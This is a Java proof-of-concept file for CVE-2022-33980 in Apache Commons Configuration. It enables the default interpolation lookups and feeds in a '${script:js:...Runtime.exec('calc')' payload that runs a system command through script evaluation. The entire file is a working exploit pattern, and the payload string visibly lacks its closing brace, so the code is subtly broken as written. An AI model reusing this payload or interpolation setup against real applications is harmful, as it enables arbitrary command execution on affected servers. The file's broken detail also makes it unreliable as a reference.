package commons_configuration2;

import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;

public class CVE_2022_33980 {

    public static void main(String[] args) {


        String payload = "${script:js:java.lang.Runtime.getRuntime().exec('calc')";
        InterpolatorSpecification spec = new InterpolatorSpecification.Builder()
                .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
                .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
                .create();

        ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(spec);
        interpolator.interpolate(payload);
    }
}
